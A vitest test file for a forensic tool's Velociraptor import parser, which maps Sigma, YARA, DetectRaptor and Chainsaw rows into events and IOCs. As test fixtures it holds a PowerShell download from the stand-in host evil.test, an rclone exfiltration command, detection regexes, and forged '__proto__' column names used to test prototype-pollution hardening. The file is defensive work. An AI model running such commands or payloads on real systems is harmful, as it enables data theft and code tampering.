import { describe, it, expect, afterEach } from "vitest";
import {
  parseVelociraptorJson,
  parseVelociraptorJsonProgress,
} from "../../src/analysis/velociraptorImport.js";
import { correlateEvents } from "../../src/analysis/correlate.js";

// Mirrors public/js/dashboard-text.js's splitEventTitle: the row's displayed TITLE is everything
// before the first " - "; the rest collapses into the [details] panel. Tests below use this to
// assert what an analyst actually sees on the row without expanding it — e.g. that the host
// (already shown in its own chip) never leaks into the title.
function splitEventTitle(desc: string): { title: string; rest: string } {
  const i = desc.indexOf(" - ");
  return i < 0 ? { title: desc, rest: "" } : { title: desc.slice(0, i), rest: desc.slice(i + 3) };
}

// ── A Velociraptor Sigma detection row (parsed evtx event + matched rule).
function sigmaRow(): object {
  return {
    _Source: "Windows.Detection.Sigma",
    Rule: { Title: "Mimikatz LSASS Access", Level: "critical", Tags: ["attack.t1003.001"] },
    System: {
      EventID: 10,
      Channel: "Microsoft-Windows-Sysmon/Operational",
      Computer: "DC01",
      TimeCreated: "2023-03-01T10:00:00Z",
    },
    EventData: { TargetImage: "C:\\Windows\\System32\\lsass.exe", SourceImage: "C:\\temp\\mimikatz.exe" },
  };
}

// ── A Velociraptor YARA detection row (file glob scan).
function yaraRow(): object {
  return {
    _Source: "Windows.Detection.Yara.Glob",
    Rule: "APT_Malware_Foo",
    Namespace: "default",
    Meta: { author: "x", mitre: "T1059" },
    Strings: ["$a"],
    OSPath: "C:\\Users\\bob\\evil.exe",
    HashSHA256: "aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899",
  };
}

// ── A Velociraptor parsed-evtx row (no detection) — EventID as a {Value} object.
function eventlogRow(): object {
  return {
    _Source: "Windows.EventLogs.Evtx",
    System: {
      EventID: { Value: 4624 },
      Channel: "Security",
      Computer: "WS05",
      TimeCreated: "2023-03-01T08:00:00Z",
    },
    EventData: { TargetUserName: "alice", TargetDomainName: "CORP", IpAddress: "10.0.0.20", LogonType: "3" },
  };
}

// ── A Velociraptor netstat row — now routed through mapNetstat.
function netstatRow(): object {
  return {
    _Source: "Windows.Network.Netstat",
    Pid: 4321,
    Name: "evil.exe",
    Path: "C:\\temp\\evil.exe",
    Raddr: "8.8.8.8",
    Status: "ESTABLISHED",
    _ts: 1677662400,
  };
}

describe("parseVelociraptorJson — detection rows", () => {
  it("maps a Sigma row verdict-first over the parsed evtx event", () => {
    const r = parseVelociraptorJson(JSON.stringify([sigmaRow()]));
    expect(r.detections).toBe(1);
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.description).toContain("Sigma: Mimikatz LSASS Access"); // artifact tag may precede "Sigma:"
    expect(e.description).toContain("[Windows.Detection.Sigma]"); // source artifact surfaced
    expect(e.description).toContain("EID 10"); // the underlying event is still mapped
    expect(e.severity).toBe("Critical"); // Sigma critical ≥ the EVTX-derived High
    expect(e.mitreTechniques).toContain("T1003.001");
    expect(e.asset).toBe("DC01");
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("maps a YARA row as a High detection with rule, path and hash", () => {
    const r = parseVelociraptorJson(JSON.stringify([yaraRow()]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    expect(e.description).toContain("YARA: APT_Malware_Foo"); // artifact tag may precede "YARA:"
    expect(e.severity).toBe("High");
    expect(e.path).toBe("C:\\Users\\bob\\evil.exe");
    expect(e.sha256).toBe("aabbccddeeff00112233445566778899aabbccddeeff00112233445566778899");
    expect(e.mitreTechniques).toContain("T1059"); // from rule Meta
    expect(r.iocs.find((i) => i.type === "file")?.value).toBe("C:\\Users\\bob\\evil.exe");
    expect(r.iocs.some((i) => i.type === "hash")).toBe(true);
  });
});

describe("parseVelociraptorJson — artifactName provenance", () => {
  // Every mapped event must carry artifactName = the VQL artifact that produced it, so downstream
  // (dwell-time window, evidence graph) can tell "from the MFT" apart from "a Sigma detection".
  it("persists the VQL artifact name onto each mapped event (artifactName)", () => {
    // A multi-artifact map exercises several mappers at once: a Sigma detection, a YARA hit, and a
    // netstat telemetry row — each event should be stamped with its own source artifact.
    const raw = JSON.stringify({
      "Windows.Detection.Sigma": [sigmaRow()],
      "Windows.Detection.Yara.Glob": [yaraRow()],
      "Windows.Network.Netstat": [netstatRow()],
    });
    const r = parseVelociraptorJson(raw);
    expect(r.events.length).toBeGreaterThan(0);
    // No event lacks provenance.
    expect(r.events.every((e) => typeof e.artifactName === "string" && e.artifactName.length > 0)).toBe(true);
    // And each is stamped with the artifact that actually produced it.
    expect(r.events.some((e) => e.artifactName === "Windows.Detection.Sigma")).toBe(true);
    expect(r.events.some((e) => e.artifactName === "Windows.Detection.Yara.Glob")).toBe(true);
    expect(r.events.some((e) => e.artifactName === "Windows.Network.Netstat")).toBe(true);
  });
});

// Velociraptor data indexed into Elasticsearch, then pushed from Kibana by the extension: rows
// arrive reshaped (dotted keys, `.keyword` multi-fields, the artifact in the `artifact_<name>` index,
// ES doc metadata). normalizeElasticRow should reverse that so the native mappers fire.
describe("parseVelociraptorJson — Elastic-indexed Velociraptor (Kibana push)", () => {
  it("MFT keyword hit → keyword-escalated High detection, dated, DetectRaptor-labeled, Velociraptor source", () => {
    const row = {
      _id: "x1",
      _index: "artifact_detectraptor_windows_detection_mft",
      _version: 1,
      "@timestamp": "2026-05-07T16:03:56.000Z",
      "Detection.StringHit": "PsExec.exe",
      "Detection.KeywordRegex": "psexec\\.exe$|psexec64\\.exe$|remcom\\.exe$",
      "Artifact.keyword": "DetectRaptor.Windows.Detection.MFT",
      "SITimestamps.LastRecordChange0x10": "2026-01-28T09:47:39.493Z",
      FlowId: "F.D7U8JESNJITC2",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    expect(e.severity).toBe("High"); // "psexec" keyword
    expect(e.description).toContain("PsExec.exe");
    expect(e.description).toContain("DetectRaptor MFT detection:");
    expect(e.description).not.toContain("_index");
    expect(e.timestamp).toContain("2026-01-28"); // the artifact's own MFT time, not @timestamp
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("EVTX scriptblock row → dated generic event with the Message, Velociraptor source", () => {
    const row = {
      _id: "y1",
      _index: "artifact_detectraptor_windows_detection_evtx",
      _version: 1,
      "@timestamp": "2026-05-07T16:31:04.000Z",
      "Detection.Regex": "psexec",
      "EventData.ScriptBlockText":
        "Creating Scriptblock text (1 of 1): # Copyright 2008, Microsoft Corporation.",
      Message: "Creating Scriptblock text (1 of 1): # Copyright 2008, Microsoft Corporation.",
      "Artifact.keyword": "DetectRaptor.Windows.Detection.Evtx",
    };
    const e = parseVelociraptorJson(JSON.stringify([row])).events[0];
    expect(e.description).toContain("Creating Scriptblock");
    expect(e.description).toContain("DetectRaptor.Windows.Detection.Evtx");
    expect(e.timestamp).toContain("2026-05-07"); // @timestamp fallback
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("parses an Elastic Discover CSV export (dotted/.keyword headers, Kibana dates, '-' nulls)", () => {
    const csv = [
      '"@timestamp",Artifact,"Artifact.keyword","Detection.Criticality","Detection.Name","Detection.StringHit",EntryPath,"EntryPath.keyword",_index,_Source',
      '"May 7, 2026 @ 16:31:04.000",DetectRaptor.Windows.Detection.Amcache,DetectRaptor.Windows.Detection.Amcache,Medium,"Execution - PsExec",PsExec.exe,"c:\\tools\\psexec.exe","c:\\tools\\psexec.exe",artifact_detectraptor_windows_detection_amcache,"-"',
    ].join("\n");
    const r = parseVelociraptorJson(csv);
    expect(r.format).toBe("csv");
    expect(r.events).toHaveLength(1);
    const e = r.events[0];
    expect(e.severity).toBe("Medium"); // honors Detection.Criticality over the psexec keyword
    // The rule NAME itself has an internal " - " ("Execution - PsExec"); it's neutralized to an
    // em dash so the dashboard's title/detail split doesn't truncate on it (see titleSafe).
    expect(e.description).toContain("Execution — PsExec");
    expect(e.description).not.toContain("Execution - PsExec");
    expect(e.description).toContain("DetectRaptor Amcache detection:");
    // The triggering file is promoted into the title too, distinguishing this from other hits.
    const title = splitEventTitle(e.description).title;
    expect(title).toContain("psexec.exe"); // basename of EntryPath, lowercased in the CSV row
    expect(e.description).not.toContain("-1"); // "-" cells dropped, not rendered
    expect(e.timestamp).toContain("2026-05-07T16:31:04"); // Kibana "@" date → ISO
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("synthesizes the artifact source from the index name when no Artifact field is present", () => {
    const row = {
      _index: "artifact_custom_windows_detection_amcache",
      "@timestamp": "2026-05-07T16:31:04.000Z",
      "Detection.StringHit": "mimikatz.exe",
      EntryPath: "c:\\tools\\mimikatz.exe",
    };
    const e = parseVelociraptorJson(JSON.stringify([row])).events[0];
    expect(e.severity).toBe("High"); // mimikatz keyword
    expect(e.description).toContain("custom_windows_detection_amcache"); // index-derived source
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("MFT hit on a .yms Sigma-rule filename: keyword match is against the rule itself, not attacker content → Info, no file IOC", () => {
    const row = {
      _Source: "DetectRaptor.Windows.Detection.MFT",
      EventTime: "2026-07-02T12:37:57.1022486Z",
      Detection: "Mimikatz Tools",
      OSPath: "registry_event_cve_2021_1675_mimikatz_printernightmare_drivers.yms",
      Fqdn: "DESKTOP-MNNUHHU.localdomain",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.severity).toBe("Info"); // .yms is a compiled Sigma signature, not the matched target
    expect(e.description).toContain("Mimikatz Tools");
    expect(e.sources).toEqual(["Velociraptor"]);
    expect(r.iocs.some((i) => i.type === "file" && i.value.toLowerCase().endsWith(".yms"))).toBe(false);
  });
});

// The Elastic-indexed push arrives from the browser over POST /cases/:id/import, so its column names
// are untrusted and page-forgeable. normalizeElasticRow → unflattenDotted must never walk a dotted
// "__proto__.<x>"/"constructor.<x>"/"prototype.<x>" segment into this Node process's Object.prototype
// (CWE-1321), while benign dotted Elastic columns still unflatten to the same nested shape.
describe("parseVelociraptorJson — prototype-pollution hardening (forged dotted column names)", () => {
  afterEach(() => {
    for (const k of ["isAdmin", "polluted", "pollutedF3"])
      delete (Object.prototype as Record<string, unknown>)[k];
  });

  it("a dotted '__proto__.isAdmin' column does not pollute Object.prototype during import", () => {
    const row = {
      _index: "artifact_custom_windows_detection_x",
      "@timestamp": "2026-05-07T16:31:04.000Z",
      "__proto__.isAdmin": true, // forged, dotted — must NOT walk into Object.prototype
      "constructor.polluted": true, // ditto via constructor
      "prototype.pollutedF3": true, // ditto via prototype
      "Detection.StringHit": "mimikatz.exe",
      EntryPath: "c:\\tools\\mimikatz.exe",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    // The Node process's global prototype is untouched — nothing leaked onto a fresh object.
    expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(({} as Record<string, unknown>).pollutedF3).toBeUndefined();
    // The benign part of the row is still classified/mapped normally.
    expect(r.events).toHaveLength(1);
    expect(r.events[0].description).toContain("mimikatz.exe");
  });

  it("a benign dotted column still unflattens to its nested shape (Detection.StringHit → verdict)", () => {
    const row = {
      _index: "artifact_detectraptor_windows_detection_mft",
      "@timestamp": "2026-05-07T16:03:56.000Z",
      "Detection.StringHit": "PsExec.exe",
      "Artifact.keyword": "DetectRaptor.Windows.Detection.MFT",
      "SITimestamps.LastRecordChange0x10": "2026-01-28T09:47:39.493Z",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.detections).toBe(1);
    expect(r.events[0].severity).toBe("High"); // "psexec" keyword — proves Detection.StringHit unflattened into the verdict
    expect(r.events[0].description).toContain("PsExec.exe");
  });

  // The multi-field collapse in normalizeElasticRow runs BEFORE unflattenDotted and does its own
  // bracket assignment plus `bare in collapsed` membership tests. A forged bare "__proto__" column
  // carrying an object would set that accumulator's prototype, so every subsequent `in` test consults
  // the attacker's object — silently discarding the real ".keyword" columns whose bare names it names.
  it("a forged bare '__proto__' column cannot suppress a benign '.keyword' column via the collapse step", () => {
    const row = JSON.parse(String.raw`{
      "__proto__": { "Artifact": "attacker-suppressed", "EntryPath": "attacker-suppressed" },
      "_index": "artifact_detectraptor_windows_detection_mft",
      "@timestamp": "2026-05-07T16:03:56.000Z",
      "Detection.StringHit": "PsExec.exe",
      "Artifact.keyword": "DetectRaptor.Windows.Detection.MFT",
      "EntryPath.keyword": "c:\\tools\\psexec.exe"
    }`);
    const r = parseVelociraptorJson(JSON.stringify([row]));
    // The real Artifact/EntryPath values still reach the event — not dropped by a poisoned `in` test.
    expect(r.events[0].description).toContain("DetectRaptor MFT detection:");
    expect(r.events[0].description).toContain("PsExec.exe");
    expect(r.events[0].description).not.toContain("attacker-suppressed");
  });
});

// DetectRaptor-style "*.Detection.*" artifacts carry the verdict in a `Detection`/`RuleName`
// field rather than a Sigma/YARA `Rule`. These rows have no `_Source`.
describe("parseVelociraptorJson — DetectRaptor detection rows", () => {
  it("named-pipe hit: Detection string + Exe + PipeName → keyword-escalated High, verdict-first", () => {
    const row = {
      EventTime: "2025-03-14T21:25:03Z",
      Detection: "Cobalt Strike: trick_ryuk.profile",
      ProcName: "SearchIndexer.exe",
      Exe: "C:\\Windows\\system32\\SearchIndexer.exe",
      PipeName: "SearchTextHarvester",
      Type: "SysmonCreated",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: Cobalt Strike: trick_ryuk.profile");
    expect(e.description).toContain("ProcName: SearchIndexer.exe");
    expect(e.description).toContain("PipeName: SearchTextHarvester");
    expect(e.severity).toBe("High"); // "cobalt strike" keyword
    expect(e.processName).toBe("SearchIndexer.exe");
    expect(e.sources).toEqual(["Velociraptor"]);
    expect(e.timestamp).toContain("2025-03-14T21:25:03");
    expect(r.iocs.some((i) => i.type === "process" && i.value === "SearchIndexer.exe")).toBe(true);
  });

  it("Evtx detection: verdict object overlaid on the flat per-EID Windows event", () => {
    const row = {
      EventTime: "2025-04-22T11:53:50Z",
      Computer: "WIN11.windomain.local",
      Detection: {
        Name: "T1567.002-Execution of Exfiltration Programs",
        EventId: "^(4688)$",
        Regex: "rclone|megacmd",
      },
      Channel: "Security",
      EventID: 4688,
      EventData: {
        NewProcessName: "C:\\Windows\\Temp\\rclone.exe",
        CommandLine: "rclone copy C:\\data remote:exfil",
        ParentProcessName: "C:\\Windows\\System32\\cmd.exe",
      },
      Message: "A new process has been created.",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: T1567.002-Execution of Exfiltration Programs");
    expect(e.description).toContain("EID"); // EVTX event mapping overlaid after the verdict (fields joined by " - ")
    expect(e.mitreTechniques).toContain("T1567.002"); // from the verdict name
    expect(e.asset).toBe("WIN11.windomain.local");
    expect(e.severity === "Medium" || e.severity === "High").toBe(true); // ≥ Medium detection baseline
    expect(e.sources).toEqual(["Velociraptor"]);
  });

  it("GUI-flattened Evtx detection (no Channel/EventData columns): dated, MITRE, Message subject", () => {
    // The Velociraptor GUI's DetectRaptor.*.Evtx table exposes only EventTime/Computer/Detection.Name/
    // EventID/Username/Message — no Channel/EventData to overlay — so this takes the non-event verdict
    // branch. The browser extension un-flattens "Detection.Name" → Detection:{Name} before pushing.
    const row = {
      EventTime: "2026-06-03T08:28:58Z",
      Computer: "WIN11.windomain.local",
      Detection: { Name: "T1567.002-Execution of Exfiltration Programs" },
      EventID: 4688,
      Username: "",
      Message:
        "A new process has been created. Creator Subject: Security ID: S-1-5-18 New Process Name: rclone.exe",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: T1567.002-Execution of Exfiltration Programs");
    expect(e.description).toContain("rclone.exe"); // the actual process surfaced, not boilerplate
    expect(e.timestamp).toContain("2026-06-03T08:28:58"); // EventTime, not undated
    expect(e.mitreTechniques).toContain("T1567.002");
    expect(e.asset).toBe("WIN11.windomain.local");
    expect(e.severity === "Medium" || e.severity === "High").toBe(true);
  });

  it("Windows.Sigma.Base rows with the same Title but different Details stay SEPARATE events", () => {
    // The Velociraptor Sigma artifact puts the message in `Details`; 8 HackTool detections share the
    // rule Title "Antivirus Hacktool Detection" but name different tools — each is its own event.
    const mk = (ts: string, tool: string, id: number) => ({
      _Source: "Windows.Sigma.Base",
      Timestamp: ts,
      Computer: "WIN11.windomain.local",
      Channel: "Microsoft-Windows-Windows Defender/Operational",
      EID: 1011,
      Level: "high",
      Title: "Antivirus Hacktool Detection",
      RecordID: id,
      Details: `Microsoft Defender Antivirus removed an item from quarantine. name=HackTool:Win32/${tool}&threatid=${id}`,
    });
    const rows = [
      mk("2026-06-03T08:15:40.382Z", "Passview", 2147597639),
      mk("2026-06-03T08:15:40.393Z", "Wirekeyview", 2147657007),
      mk("2026-06-03T08:15:40.417Z", "Mimikatz", 2147686744),
    ];
    const r = parseVelociraptorJson(JSON.stringify(rows));
    expect(r.events).toHaveLength(3); // NOT collapsed into one ×3
    const blob = r.events.map((e) => e.description).join("\n");
    expect(blob).toContain("Passview");
    expect(blob).toContain("Mimikatz");
    expect(r.events.every((e) => /Antivirus Hacktool Detection/.test(e.description))).toBe(true);
    expect(r.events.every((e) => e.timestamp.startsWith("2026-06-03T08:15:40"))).toBe(true);
  });

  it("identical Sigma rows differing only in a volatile id DO still collapse", () => {
    const mk = (pid: number) => ({
      _Source: "Windows.Sigma.Base",
      Timestamp: "2026-06-03T08:15:40Z",
      Computer: "WIN11",
      Channel: "Security",
      EID: 4688,
      Level: "high",
      Title: "Suspicious Process",
      Details: `Process created. pid=${pid} name=evil.exe`,
    });
    const r = parseVelociraptorJson(JSON.stringify([mk(101), mk(202), mk(303)]));
    expect(r.events).toHaveLength(1);
    expect(r.events[0].count).toBe(3);
  });

  it("surfaces the LOLBIN (New Process Name + Command Line) from a rendered 4688 message", () => {
    // DetectRaptor "Use of 32-bit LOLBINs": EID 4688 shipped as free-text Message, no EventData. The
    // binary that ran is the New Process Name/Command Line, buried past the Creator/Target boilerplate.
    const row = {
      EventTime: "2026-06-03T07:56:16Z",
      Computer: "WIN11.windomain.local",
      Detection: { Name: "T1567.002-Use of 32-bit LOLBINs" },
      EventID: 4688,
      Message: [
        "A new process has been created.",
        "",
        "Creator Subject:",
        "\tSecurity ID:\t\tS-1-5-18",
        "\tAccount Name:\t\tWIN11$",
        "",
        "Target Subject:",
        "\tSecurity ID:\t\tS-1-0-0",
        "\tAccount Name:\t\t-",
        "",
        "Process Information:",
        "\tNew Process Name:\tC:\\Windows\\SysWOW64\\dllhost.exe!S!",
        '\tProcess Command Line:\t"C:\\Windows\\SysWOW64\\DllHost.exe" /Processid:{5250E46F-BB09-D602}!S!',
      ].join("\n"),
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Use of 32-bit LOLBINs");
    expect(e.description).toContain("dllhost.exe"); // the LOLBIN binary, surfaced
    expect(e.description).toContain("/Processid:"); // its command line, surfaced
    expect(e.description).not.toContain("Token Elevation Type"); // boilerplate not leading
    expect(e.timestamp).toContain("2026-06-03T07:56:16");
    expect(r.iocs.some((i) => i.type === "process" && i.value === "dllhost.exe")).toBe(true);
  });

  it("names the triggering file (EntryPath) in an Amcache-style detection verdict", () => {
    const row = {
      Detection: { Name: "Defence Evasion", KeywordRegex: "CleanWipe|RULEPAT_MARKER", Criticality: "Medium" },
      KeyMTime: "2026-06-06T20:42:51Z",
      EntryName: "kprocesshacker.sys",
      EntryPath: "c:\\program files\\process hacker 2\\kprocesshacker.sys",
      SHA1: "a".repeat(40),
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Defence Evasion");
    expect(e.description).toContain("kprocesshacker.sys"); // the file that fired the rule
    expect(e.description).not.toContain("RULEPAT_MARKER"); // the KeywordRegex pattern is kept out
    expect(r.iocs.some((i) => i.type === "file" && i.value.includes("kprocesshacker.sys"))).toBe(true);
  });

  it("promotes the triggering file into the TITLE itself, so two hits of the same rule stay distinguishable without opening [details]", () => {
    const quickAssist = {
      _Source: "DetectRaptor.Windows.Detection.Amcache",
      Computer: "DESKTOP-OPE297N.localdomain",
      Detection: { Name: "RMM" },
      EntryPath: "c:\\program files\\microsoft quick assist\\quickassist.exe",
    };
    const anydesk = {
      _Source: "DetectRaptor.Windows.Detection.Amcache",
      Computer: "DESKTOP-OPE297N.localdomain",
      Detection: { Name: "RMM" },
      EntryPath: "c:\\program files (x86)\\anydesk\\anydesk.exe",
    };
    const r = parseVelociraptorJson(JSON.stringify([quickAssist, anydesk]));
    const [qa, ad] = r.events;
    const qaTitle = splitEventTitle(qa.description).title;
    const adTitle = splitEventTitle(ad.description).title;
    expect(qaTitle).toContain("quickassist.exe");
    expect(adTitle).toContain("anydesk.exe");
    expect(qaTitle).not.toBe(adTitle); // same rule, same label — the file is what tells them apart
    // The host chip already shows the host — it must not also sit inside the title text.
    expect(qaTitle).not.toContain("DESKTOP-OPE297N");
    expect(adTitle).not.toContain("DESKTOP-OPE297N");
  });

  it("keeps the full rule NAME in the title even when the name itself contains a ' - ' (DetectRaptor's own naming convention)", () => {
    // Real DetectRaptor rule names ("RMM - Microsoft Quick Assist Execution", "Suspicious
    // Location - Local Temp Executable or Script") embed a " - " — the exact separator
    // splitEventTitle uses to find the title/detail boundary. Left unhandled, the FIRST " - "
    // (inside the rule name) wins, and the title truncates to "RMM" before the promoted file tag
    // ever renders — a bug only visible once the string is actually split, not just substring-matched.
    const row = {
      _Source: "DetectRaptor.Windows.Detection.Amcache",
      Computer: "DESKTOP-OPE297N.localdomain",
      Detection: { Name: "RMM - Microsoft Quick Assist Execution" },
      OSPath: "c:\\program files\\windowsapps\\...\\quickassist.exe",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const { title } = splitEventTitle(r.events[0].description);
    expect(title).toContain("RMM");
    expect(title).toContain("Microsoft Quick Assist Execution");
    expect(title).toContain("quickassist.exe");
  });

  it("surfaces the matched Content of a PSReadline/ISE detection, not just the rule name", () => {
    const row = {
      Detection: {
        ID: "win_ps_b64",
        Name: "Powershell large Base64 blob - IN DEVELOPMENT",
        Regex: "[a-z0-9+/]{44,}",
        HitString: "Sy1pYktKVUJX",
      },
      FileInfo: { OSPath: "C:\\Users\\v\\ise.ps1", Mtime: "2026-06-03T08:40:48Z" },
      Content: "download elasticagent from https://www.elastic.co/downloads/elastic-agent",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Powershell large Base64 blob");
    expect(e.description).toContain("elastic.co/downloads"); // the matched content
    expect(e.description).not.toMatch(/\[a-z0-9/); // the rule Regex must not leak
    expect(e.severity).toBe("Low"); // IN DEVELOPMENT
  });

  it("MFT detection: object verdict with explicit Criticality wins; nested $SI timestamp resolved", () => {
    const row = {
      Detection: { Name: "BAU Cloud Data Transfer", KeywordRegex: "OneDrive\\.exe", Criticality: "Low" },
      OSPath: "\\\\.\\C:\\Users\\labuser\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe",
      SITimestamps: { Created0x10: "2021-12-09T17:28:24Z", LastModified0x10: "2026-06-03T08:29:42Z" },
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: BAU Cloud Data Transfer");
    expect(e.severity).toBe("Low"); // explicit Criticality:"Low" wins over the Medium baseline
    expect(e.timestamp).toContain("2026-06-03T08:29:42"); // SITimestamps.LastModified0x10
    expect(e.path).toContain("OneDrive.exe");
  });

  it("PSReadline: RuleName verdict + command Line → Medium, MITRE from the rule name, FileInfo time", () => {
    const row = {
      RuleID: "win_powershell_web",
      RuleName: "T1059.001-PowerShell Web Request",
      Line: "Invoke-WebRequest -Uri https://evil.test/x.ps1 -OutFile a.ps1",
      RuleRegex: "Invoke-WebRequest|iwr |curl ",
      FileInfo: { OSPath: "C:\\Users\\v\\...\\ConsoleHost_history.txt", Mtime: "2026-06-03T08:40:48Z" },
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.description).toContain("Velociraptor detection: T1059.001-PowerShell Web Request");
    expect(e.description).toContain("Invoke-WebRequest");
    expect(e.severity).toBe("Medium");
    expect(e.mitreTechniques).toContain("T1059.001");
    expect(e.timestamp).toContain("2026-06-03T08:40:48"); // nested FileInfo.Mtime
    expect(r.iocs.some((i) => i.type === "url" && i.value.includes("evil.test"))).toBe(true);
  });

  it("downgrades an 'IN DEVELOPMENT' rule to Low and keeps the rule regex out of the description", () => {
    const row = {
      Detection: {
        ID: "win_powershell_encoded_command",
        Name: "Powershell encoded command - IN DEVELOPMENT",
        Regex: "[-]e(nc*o*d*e*d*)*\\s+[^-]",
        HitString: "-enc",
      },
      FileInfo: { OSPath: "C:\\Users\\v\\AutoSave\\Untitled1.ps1", Mtime: "2025-03-14T21:56:04Z" },
      Content: "elastic-agent.exe install --url=http://192.168.56.50:8220 --insecure",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    const e = r.events[0];
    expect(e.severity).toBe("Low");
    // The rule NAME has its own internal " - "; neutralized to an em dash (titleSafe) so it
    // doesn't get mistaken for the title/detail boundary and truncate the title early.
    expect(e.description).toContain("Powershell encoded command — IN DEVELOPMENT");
    expect(e.description).not.toContain("nc*o*d*e*d"); // the rule Regex must not leak into the description
    expect(r.iocs.some((i) => i.type === "ip" && i.value === "192.168.56.50")).toBe(true); // scraped from Content
  });
});

// ── A Velociraptor artifact that shells out to Chainsaw and streams its rows back as VQL:
// Chainsaw's own flat Sigma-mapping shape (Detection/Severity/Rule Group siblings), NOT
// Velociraptor's DetectRaptor {Detection:{Name,Criticality}} convention. Must NOT be
// misclassified as a generic `detection` row, or the real Severity is lost.
describe("parseVelociraptorJson — Chainsaw rows shelled out via a Velociraptor artifact", () => {
  function chainsawLogClearedRow(): object {
    return {
      _Source: "Custom.Windows.Detection.Chainsaw",
      EventTime: "2026-07-02T09:12:00Z",
      Detection: "Security Audit Logs Cleared",
      Severity: "critical",
      Status: "stable",
      "Rule Group": "Log Tampering",
      Computer: "WIN-CASEHOST7",
      Channel: "Security",
      EventID: 1102,
      SystemData: {
        EventID: 1102,
        Provider_attributes: { Name: "Microsoft-Windows-Eventlog" },
        Computer: "WIN-CASEHOST7",
      },
      EventData: { SubjectUserName: "labuser", SubjectDomainName: "DESKTOP-MNNUHHU" },
      Authors: ["frack113"],
    };
  }

  it("reads the sibling Severity field instead of guessing from the title keyword", () => {
    const r = parseVelociraptorJson(JSON.stringify([chainsawLogClearedRow()]));
    expect(r.detections).toBe(1);
    const e = r.events[0];
    // A generic DetectRaptor-style read would find no keyword match on "Security Audit Logs
    // Cleared" and default to Medium — this MUST come from the row's own "critical".
    expect(e.severity).toBe("Critical");
    expect(e.description).toContain("Chainsaw/Log Tampering: Security Audit Logs Cleared");
    expect(e.asset).toBe("WIN-CASEHOST7");
    expect(e.sources).toEqual(["Chainsaw"]); // corroboration stays keyed to the real tool, not "Velociraptor"
  });

  it("does not confuse a real DetectRaptor bare-string Detection (no EventID) for the flat Chainsaw shape", () => {
    const row = {
      EventTime: "2025-03-14T21:25:03Z",
      Detection: "Cobalt Strike: trick_ryuk.profile",
      Exe: "C:\\x.exe",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.events[0].description).toContain("Velociraptor detection: Cobalt Strike: trick_ryuk.profile");
    expect(r.events[0].sources).toEqual(["Velociraptor"]);
  });
});

describe("parseVelociraptorJson — IOC hygiene & extra time keys (#102)", () => {
  it("a YARA hit extracts only the matched file — NOT the rule's Meta references / HitContext bytes", () => {
    const row = {
      _Source: "DetectRaptor.Generic.Detection.YaraFile",
      OSPath: "C:\\ProgramData\\Adobe\\arm.exe",
      Mtime: "2026-06-12T11:12:41Z",
      Rule: "SUSP_Download_Temp_Rundll",
      Tags: ["POWERSHELL", "DOWNLOAD"],
      Meta: {
        author: "X",
        reference: "https://github.com/SIFalcon/Detection",
        source_url: "https://github.com/x/y.yar",
        hash: "a".repeat(64),
      },
      HitContext: "deadbeef" + "b".repeat(64) + " http://rule-example.test/sample",
    };
    const r = parseVelociraptorJson(JSON.stringify([row]));
    expect(r.iocs.filter((i) => i.type === "file")).toHaveLength(1);
    expect(r.iocs.some((i) => i.type === "file" && i.value.includes("arm.exe"))).toBe(true);
    expect(r.iocs.some((i) => i.type === "hash")).toBe(false); // no Meta/HitContext hashes
    expect(r.iocs.some((i) => i.type === "url")).toBe(false); // no Meta reference URLs
  });

  it("tags every event type with its source artifact (_Source) so it can be traced back", () => {
    const detection = {
      _Source: "DetectRaptor.Windows.Detection.LolDrivers",
      Detection: { Name: "Defence Evasion" },
      EntryPath: "c:\\x\\kproc.sys",
      KeyMTime: "2026-06-06T20:42:51Z",
    };
    const generic = {
      _Source: "Windows.Analysis.EvidenceOfDownload",
      DownloadedFilePath: "C:\\Users\\v\\a.exe",
      Mtime: "2026-06-03T08:00:00Z",
    };
    const det = parseVelociraptorJson(JSON.stringify([detection])).events[0];
    const gen = parseVelociraptorJson(JSON.stringify([generic])).events[0];
    // DetectRaptor detections lead with the specific rule-pack name (not the generic "Velociraptor"
    // bucket); other Velociraptor-hosted artifacts still get the bracketed full artifact name.
    expect(det.description).toContain("DetectRaptor LolDrivers detection:");
    expect(gen.description).toContain("Velociraptor [Windows.Analysis.EvidenceOfDownload]:");
    // The filename fallback (no _Source) is NOT shown as a bracketed artifact tag.
    const noSource = parseVelociraptorJson(
      JSON.stringify([{ Detection: { Name: "X" }, EntryPath: "c:\\y.sys" }]),
      { artifact: "0036_velociraptor-2026.json" },
    ).events[0];
    expect(noSource.description).not.toContain("[0036_velociraptor");
  });

